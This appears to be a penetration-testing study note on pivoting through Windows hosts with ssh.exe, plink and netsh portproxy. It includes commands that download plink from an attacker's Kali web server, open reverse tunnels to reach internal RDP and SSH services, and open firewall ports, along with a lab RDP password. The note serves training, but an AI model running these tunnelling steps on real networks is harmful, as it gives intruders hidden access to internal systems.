---
description: test
---

# Port forwarding on Windows

## ssh.exe

check ssh version on windows:

```powershell
ssh.exe -V
```

* if version of OpenSSH bundled with Windows is higher than <mark style="color:green;">**7.6**</mark>, it can be used for remote dynamic port forwarding.

create a remote dynamic port forward to Kali machine:

```powershell
ssh -N -R 9998 kali@192.168.118.4
```

* pass the port **9998** to **-R** and authenticate as _kali_ back on our Kali machine.

check socks proxy is open on kali:

```sh
ss -ntplu
```

add proxy config to **/etc/proxychains4.conf:**

* `socks5 127.0.0.1 9998`&#x20;

***

## Plink

Most networks have SSH servers running somewhere, and administrators need tools to connect to these servers from Windows hosts.

Upload plink from kali:

{% code overflow="wrap" %}
```
find / -name plink.exe 2>/dev/null

sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```
{% endcode %}

Download plink on windows machine:

{% code overflow="wrap" %}
```powershell
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```
{% endcode %}

Using plink for remote port forwarding:

{% code overflow="wrap" %}
```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
{% endcode %}

* **-R:** specify remote port forwarding
* **-l**: username
* **-pw**: password

connect to port 9833 on the Kali loopback interface with **xfreerdp** as the _rdp\_admin_ user:

```powershell
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```



***

## Netsh

{% code overflow="wrap" %}
```powershell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```
{% endcode %}

* **v4tov4:** struct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port
* **listenport=2222 listenaddress=192.168.50.64: l**isten on port 2222 on the external-facing interface
* **connectport=22 connectaddress=10.4.50.215:** forward packets to port 22 on PGDATABASE01

confirm that port 2222 is listening:

```powershell
netstat -anp TCP | find "2222"

netsh interface portproxy show all
```

Open port 2222 on the firewall by adding rule:

{% code overflow="wrap" %}
```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```
{% endcode %}

Delete firewall rule:

{% code overflow="wrap" %}
```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
{% endcode %}

Delete port forwarding:

{% code overflow="wrap" %}
```powershell
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
{% endcode %}
